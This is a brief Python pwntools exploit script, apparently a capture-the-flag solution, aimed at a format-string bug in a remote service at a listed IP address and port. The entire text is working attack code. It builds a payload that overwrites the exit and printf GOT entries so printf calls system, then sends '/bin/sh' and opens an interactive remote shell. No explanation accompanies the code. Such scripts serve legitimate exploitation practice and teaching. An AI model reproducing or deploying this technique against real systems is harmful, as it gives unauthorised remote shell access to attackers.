from pwn import *

r = remote("103.237.99.35", 28992)
#r = process("./formatstring")
#gdb.attach(r)
r.recv()

main = 0x80485a4
exit_got = 0x0804a020
printf_got = 0x0804a00c
system_plt = 0x8048430

l = 0x85a4

# exit_got + 0
payload = "%{}x%21$hn".format(l)
# exit_got + 1

l = (65536 - l + 0x8430)%65536
payload += "%{}x%22$hn".format(l)

l = (65536 - 0x82bc + 0x0804 )%65536 - 372
payload += "%{}x%23$hn".format(l)


payload += "1"*(40 - len(payload))
payload += p32(exit_got) + p32(printf_got) + p32(printf_got+2)

r.sendline(payload)
print r.recv()
r.sendline("/bin/sh")
r.interactive()